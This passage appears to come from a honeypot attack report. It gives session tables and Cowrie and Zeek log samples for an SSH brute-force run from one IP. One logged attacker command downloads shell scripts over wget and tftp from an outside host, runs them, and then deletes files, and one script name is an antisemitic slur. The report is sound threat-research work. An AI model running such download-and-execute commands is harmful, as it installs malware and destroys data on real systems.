| `8ce098204f07` | `138.197.148.152` | `36472` | `2222` | `2024-01-10 02:22:53.269928` | `2024-01-10 02:22:54.790879` | `0.520951` |
| `9c34cf3b286f` | `138.197.148.152` | `37304` | `2222` | `2024-01-10 02:23:09.568186` | `2024-01-10 02:23:11.095008` | `0.526822` |
| `bf7dcf6d3b40` | `138.197.148.152` | `41790` | `2222` | `2024-01-10 02:23:12.132006` | `2024-01-10 02:23:13.653960` | `0.521954` |
| `35303cab3f63` | `138.197.148.152` | `43820` | `2222` | `2024-01-10 02:23:13.296516` | `2024-01-10 02:23:14.816943` | `0.520427` |
| `9713c1c8e070` | `138.197.148.152` | `44514` | `2222` | `2024-01-10 02:23:13.703441` | `2024-01-10 02:23:15.233651` | `0.53021` |
| `4e9fc4ff5453` | `138.197.148.152` | `48204` | `2222` | `2024-01-10 02:23:15.871828` | `2024-01-10 02:23:17.403664` | `0.531836` |
| `dde6b36c9d53` | `138.197.148.152` | `48424` | `2222` | `2024-01-10 02:23:15.996684` | `2024-01-10 02:23:17.513720` | `0.517036` |
| `272e6f2ed32d` | `138.197.148.152` | `49114` | `2222` | `2024-01-10 02:23:16.407040` | `2024-01-10 02:23:17.946982` | `0.539942` |
| `978912c179e3` | `138.197.148.152` | `52768` | `2222` | `2024-01-10 02:23:18.511622` | `2024-01-10 02:23:20.033420` | `0.521798` |
| `f1ed85d16103` | `138.197.148.152` | `53084` | `2222` | `2024-01-10 02:23:35.734610` | `2024-01-10 02:23:37.252047` | `0.517437` |
| `db12759227b4` | `138.197.148.152` | `57860` | `2222` | `2024-01-10 02:23:38.685761` | `2024-01-10 02:23:40.218637` | `0.532876` |
| `650a986d53df` | `138.197.148.152` | `59696` | `2222` | `2024-01-10 02:23:39.823318` | `2024-01-10 02:23:41.340812` | `0.517494` |
| `6f96ebf66395` | `138.197.148.152` | `60376` | `2222` | `2024-01-10 02:23:40.236748` | `2024-01-10 02:23:41.740286` | `0.503538` |
| `1466bab2017d` | `138.197.148.152` | `35818` | `2222` | `2024-01-10 02:23:42.570923` | `2024-01-10 02:23:44.102835` | `0.531912` |
| `3b3b231516f3` | `138.197.148.152` | `36272` | `2222` | `2024-01-10 02:23:42.858884` | `2024-01-10 02:23:44.375457` | `0.516573` |
| `561b9b69012a` | `138.197.148.152` | `36942` | `2222` | `2024-01-10 02:23:43.283988` | `2024-01-10 02:23:44.806806` | `0.522818` |
| `122ffc7274d8` | `138.197.148.152` | `40656` | `2222` | `2024-01-10 02:23:45.638765` | `2024-01-10 02:23:47.162096` | `0.523331` |

</details>

---


</details>

---


<details>
<summary>
<h1>Relevant Logs, File or Email</h1>
</summary>


## Log Stats

| Log Name | Lines |
| --- | --- |
| cowrie.log | 1916 |
| cowrie.json | 1236 |
| dshield.log | 2 |
| zeek.log | 733 |


## Cowrie .log Logs
Total Cowrie logs: `1916`

#### First Session With Commands 8599dd602207 Cowrie .log Logs
This sample shows the Cowrie `.log` Logs for session_id `8599dd602207` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is a sample of the first `50` lines:

<details>
<summary>
<h3>Cowrie .log Logs for 8599dd602207</h3>
</summary>


````verilog
2024-01-10T02:01:37.845658Z [HoneyPotSSHTransport,72,138.197.148.152] Connection lost after 0 seconds
2024-01-10T02:01:37.952177Z [HoneyPotSSHTransport,73,138.197.148.152] Connection lost after 0 seconds
2024-01-10T02:01:44.612777Z [HoneyPotSSHTransport,74,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:44.681150Z [HoneyPotSSHTransport,74,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:44.896874Z [HoneyPotSSHTransport,75,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:44.967718Z [HoneyPotSSHTransport,75,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:44.986673Z [HoneyPotSSHTransport,76,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:45.033881Z [HoneyPotSSHTransport,77,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:45.050300Z [HoneyPotSSHTransport,74,138.197.148.152] first time for 138.197.148.152, need: 5
2024-01-10T02:01:45.050408Z [HoneyPotSSHTransport,74,138.197.148.152] login attempt: 1
2024-01-10T02:01:45.059991Z [HoneyPotSSHTransport,74,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.061243Z [HoneyPotSSHTransport,76,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:45.104152Z [HoneyPotSSHTransport,77,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:45.181503Z [HoneyPotSSHTransport,78,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:45.224916Z [HoneyPotSSHTransport,79,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:45.257962Z [HoneyPotSSHTransport,78,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:45.298434Z [HoneyPotSSHTransport,79,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:45.301369Z [HoneyPotSSHTransport,80,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:45.342690Z [HoneyPotSSHTransport,75,138.197.148.152] already tried this combination
2024-01-10T02:01:45.352328Z [HoneyPotSSHTransport,75,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.378427Z [HoneyPotSSHTransport,80,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:45.420892Z [HoneyPotSSHTransport,81,138.197.148.152] Remote SSH version: SSH-2.0-libssh2_1.4.3
2024-01-10T02:01:45.438505Z [HoneyPotSSHTransport,76,138.197.148.152] already tried this combination
2024-01-10T02:01:45.448349Z [HoneyPotSSHTransport,76,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.479560Z [HoneyPotSSHTransport,77,138.197.148.152] already tried this combination
2024-01-10T02:01:45.489831Z [HoneyPotSSHTransport,77,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.493391Z [HoneyPotSSHTransport,81,138.197.148.152] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2024-01-10T02:01:45.662041Z [HoneyPotSSHTransport,78,138.197.148.152] already tried this combination
2024-01-10T02:01:45.684489Z [HoneyPotSSHTransport,78,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.687719Z [HoneyPotSSHTransport,79,138.197.148.152] already tried this combination
2024-01-10T02:01:45.709454Z [HoneyPotSSHTransport,79,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.782670Z [HoneyPotSSHTransport,80,138.197.148.152] already tried this combination
2024-01-10T02:01:45.792657Z [HoneyPotSSHTransport,80,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:45.801269Z [HoneyPotSSHTransport,81,138.197.148.152] already tried this combination
2024-01-10T02:01:45.810964Z [HoneyPotSSHTransport,81,138.197.148.152] login attempt [b'root'/b'root'] failed
2024-01-10T02:01:46.130691Z [HoneyPotSSHTransport,74,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.131188Z [HoneyPotSSHTransport,74,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.424583Z [HoneyPotSSHTransport,75,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.425030Z [HoneyPotSSHTransport,75,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.521169Z [HoneyPotSSHTransport,76,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.521566Z [HoneyPotSSHTransport,76,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.565272Z [HoneyPotSSHTransport,77,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.565757Z [HoneyPotSSHTransport,77,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.755151Z [HoneyPotSSHTransport,78,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.755646Z [HoneyPotSSHTransport,78,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.782268Z [HoneyPotSSHTransport,79,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.782652Z [HoneyPotSSHTransport,79,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.864748Z [HoneyPotSSHTransport,80,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'
2024-01-10T02:01:46.865178Z [HoneyPotSSHTransport,80,138.197.148.152] Connection lost after 1 seconds
2024-01-10T02:01:46.880567Z [HoneyPotSSHTransport,81,138.197.148.152] Got remote error, code 11 reason: b'Normal Shutdown, Thank you for playing'

````

</details>

---


## Cowrie .json Logs
Total Cowrie logs: `1236`

#### First Session With Commands 8599dd602207 Cowrie .json Logs
This sample shows the Cowrie `.json` Logs for session_id `8599dd602207` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is a sample of the first `50` lines:

<details>
<summary>
<h3>Cowrie .json Logs for 8599dd602207</h3>
</summary>


````json
{"eventid":"cowrie.session.connect","src_ip":"138.197.148.152","src_port":35088,"dst_ip":"172.31.5.68","dst_port":2222,"session":"8599dd602207","protocol":"ssh","message":"New connection: 138.197.148.152:35088 (172.31.5.68:2222) [session: 8599dd602207]","sensor":"","timestamp":"2024-01-10T02:02:06.979743Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.4.3","message":"Remote SSH version: SSH-2.0-libssh2_1.4.3","sensor":"","timestamp":"2024-01-10T02:02:06.980521Z","src_ip":"138.197.148.152","session":"8599dd602207"}
{"eventid":"cowrie.client.kex","hassh":"92674389fa1e47a27ddd8d9b63ecd42b","hasshAlgorithms":"diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none","kexAlgs":["diffie-hellman-group14-sha1","diffie-hellman-group-exchange-sha1","diffie-hellman-group1-sha1"],"keyAlgs":["ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc"],"macCS":["hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b","sensor":"","timestamp":"2024-01-10T02:02:07.050930Z","src_ip":"138.197.148.152","session":"8599dd602207"}
{"eventid":"cowrie.login.success","username":"root","password":"12345678","message":"login attempt [root/12345678] succeeded","sensor":"","timestamp":"2024-01-10T02:02:07.441556Z","src_ip":"138.197.148.152","session":"8599dd602207"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2024-01-10T02:02:07.624936Z","src_ip":"138.197.148.152","session":"8599dd602207"}
{"eventid":"cowrie.command.input","input":"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *","message":"CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.255.246.81/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 213.255.246.81 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.255.246.81; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *","sensor":"","timestamp":"2024-01-10T02:02:07.625510Z","src_ip":"138.197.148.152","session":"8599dd602207"}
{"eventid":"cowrie.session.file_download.failed","format":"Attempt to download file(s) from URL (%(self.url)s) failed","url":"http://213.255.246.81/fuckjewishpeople.sh","sensor":"","timestamp":"2024-01-10T02:02:07.931412Z","src_ip":"138.197.148.152","session":"8599dd602207"}
{"eventid":"cowrie.session.closed","duration":61.076626777648926,"message":"Connection lost after 61 seconds","sensor":"","timestamp":"2024-01-10T02:03:08.057054Z","src_ip":"138.197.148.152","session":"8599dd602207"}

````

</details>

---


## Zeek Logs
Total Zeek logs: `733`

#### The `0` Zeek sessions in this attack were logged in the following Zeek logs:

* `notice.log`
* `conn.log`
* `ssh.log`


<details>
<summary>
<h3>Zeek notice.log Logs</h3>
</summary>

Here is a sample of the first `50` lines:

````log
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	notice
#open	2024-01-10-01-38-59
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	fuid	file_mime_type	file_desc	proto	note	msg	sub	src	dst	p	n	peer_descr	actions	email_dest	suppress_for	remote_location.country_code	remote_location.region	remote_location.city	remote_location.latitude	remote_location.longitude
#types	time	string	addr	port	addr	port	string	string	string	enum	enum	string	string	addr	addr	port	count	string	set[enum]	set[string]	interval	string	string	string	double	double
1704852111.188568	CEC5xfsDDfblPzL5g	138.197.148.152	53250	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:53250 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.433432	CUhfmu0HXscUtevH7	138.197.148.152	58904	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:58904 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.521626	C1WXCB2Gj0qgPAXp1d	138.197.148.152	60536	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:60536 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.565743	CHtXAz4EqXNkzVJlik	138.197.148.152	33280	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:33280 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.755800	ClsFLm3pAJdAWRgPc	138.197.148.152	35600	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:35600 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.782609	Cr2ym03P9Y1oPAc5nj	138.197.148.152	36160	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:36160 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.925128	CWkOyj4QlB6W0YNxUj	138.197.148.152	37594	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:37594 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852111.925128	C2jztC4piLggJ9PWl5	138.197.148.152	39134	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:39134 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852114.317533	C1PNGGmrNMP3vfd8	138.197.148.152	43316	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:43316 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852114.395283	CLuy2lqdiXkAE2euf	138.197.148.152	44350	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:44350 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852114.893375	CB1A1c7FWBJ1O71Hl	138.197.148.152	49780	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:49780 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852114.958500	CKwrBa30Of5jYDlXv8	138.197.148.152	50512	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:50512 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852115.006287	CG9RCz1QQp3NPCOU8j	138.197.148.152	51110	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:51110 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852115.145341	C9T9Fi3LCcOfrtV7Pi	138.197.148.152	51830	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:51830 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852115.309195	CfmVLT1lFmOMgfspBf	138.197.148.152	53926	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:53926 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852115.526273	CUypVtQ1ZYtF3A9K	138.197.148.152	55612	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:55612 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852119.053667	Cwxcd11AsESHIahOTj	138.197.148.152	59256	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:59256 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852119.164427	C2zGmI2DM675Onp2ac	138.197.148.152	60350	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:60350 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852119.867691	Cgdi0n2tIQcgm0bY6a	138.197.148.152	37694	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:37694 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852119.959195	CImkmB4e5IV63mGFjb	138.197.148.152	38600	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:38600 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852119.975094	CFKVuFHD8KRixQIQ5	138.197.148.152	38444	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:38444 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852120.078205	CxQ8aWFKJuaRnStP8	138.197.148.152	39256	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:39256 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852120.480426	Cpfeut19Bf5DBHI0il	138.197.148.152	42212	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:42212 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852120.611708	CNDZ7H1XeyaOh2JtKd	138.197.148.152	42916	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:42916 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852125.495825	CxX3Cp1u8z8Zr0kHB3	138.197.148.152	47322	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:47322 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852125.579252	CEOhqb2PcNjFKLr5t5	138.197.148.152	47706	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:47706 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852126.606681	C8OGYo4O4pN5Yw6mz3	138.197.148.152	53958	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:53958 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852126.709491	CdGfMI37WnjKCTQNYj	138.197.148.152	54380	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:54380 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852126.709491	CtW3U41yBFUyhwVLmb	138.197.148.152	54626	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:54626 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852126.783685	C1tLWb2BhEVVgEWmqf	138.197.148.152	55054	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:55054 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852127.354154	CM30Zx2512HSjinTCd	138.197.148.152	58292	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:58292 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852127.443406	CYd0ej47kcnKoyhiE7	138.197.148.152	58742	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:58742 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852156.909627	CmGer13drYsXLemivg	138.197.148.152	35088	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:35088 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852156.970754	CyYJVe6R4gbRExn88	138.197.148.152	35446	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:35446 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.166169	CMZbkD4UM0cYqKIzeg	138.197.148.152	41690	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:41690 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.176671	CIBH88VbZ1EWeW9p9	138.197.148.152	58306	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:58306 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.436091	C8n7Lt2XB5mp51PmJ9	138.197.148.152	46590	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:46590 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.436091	CH031E1nD3Lx4xmrae	138.197.148.152	51036	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:51036 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.436091	CsnmlnMbvRHeAWAgc	138.197.148.152	42370	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:42370 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.436091	CTQbO72fP3EHwmm9D1	138.197.148.152	42848	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:42848 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.436091	CNV5ur3qoddpGpivHj	138.197.148.152	51522	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:51522 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-
1704852193.436091	CxBh56MZsslD3APPj	138.197.148.152	57652	172.31.5.68	2222	-	-	-	tcp	ProtocolDetector::Protocol_Found	138.197.148.152:57652 > 172.31.5.68:2222 SSH on port 2222/tcp	SSH	138.197.148.152	172.31.5.68	2222	-	-	Notice::ACTION_LOG	(empty)	3600.000000	-	-	-	-	-

````

</details>

---


<details>
<summary>
<h3>Zeek conn.log Logs</h3>
</summary>

Here is a sample of the first `50` lines:

````log
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2024-01-06-13-38-58
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
1704559287.953114	CvlFuj3X4Ye2IW9WWk	138.197.148.152	45139	172.31.5.68	2222	tcp	-	0.090943	0	0	RSTO	F	T	0	ShR	2	80	1	44	-
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2024-01-07-13-38-55
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
